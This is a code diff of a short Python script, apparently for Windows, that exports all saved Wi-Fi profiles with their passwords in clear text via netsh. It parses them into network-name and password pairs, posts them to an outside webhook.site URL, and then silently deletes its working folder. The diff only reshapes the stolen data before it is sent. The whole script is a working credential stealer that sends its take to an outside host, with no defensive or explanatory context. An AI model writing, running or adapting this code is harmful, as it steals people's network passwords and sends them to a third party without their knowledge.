@@ -1,9 +1,11 @@
 import os
 import requests
+import json
 os.mkdir('wifihacker')
 os.chdir('wifihacker')
 os.system('netsh wlan export profile key=clear')
 liste=[]
+data={}
 g=0
 for i in os.listdir():
     if i.startswith('WiFi-') and i.endswith('.xml'):
@@ -26,6 +28,11 @@ for i in os.listdir():
                     templist.append(back)
             g=0
             liste.append(templist)
-requests.post('https://webhook.site/c9e5dcbb-2fbe-4681-bdb7-2974a3447c4d',data={'data': str(liste)})
+for i in liste:
+    try:
+        data[i[0]]=i[1]
+    except:
+        data[i[0]]="null"
+requests.post('https://webhook.site/c9e5dcbb-2fbe-4681-bdb7-2974a3447c4d',data=data)
 os.chdir('..')
 os.system('rmdir /s /q wifihacker')
